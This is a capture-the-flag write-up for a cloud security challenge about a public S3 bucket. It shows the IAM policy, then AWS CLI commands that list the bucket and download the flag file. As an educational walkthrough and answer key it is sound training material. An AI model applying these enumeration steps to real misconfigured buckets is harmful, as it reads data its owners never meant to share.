# Challenge 1

## We all know that public buckets are risky. But can you find the flag?
- https://bigiamchallenge.com/challenge/1

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```
## Solution
```bash
> aws s3 ls
An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b
                           PRE files/
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files
                           PRE files/

aws s3 ls s3://thebigiamchallenge-storage-9979f4b/ --recursive
2023-06-05 19:13:53         37 files/flag1.txt
2023-06-08 19:18:24      81889 files/logo.png

> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt - 
{wiz:exposed-xxxxxxxxxx}
```
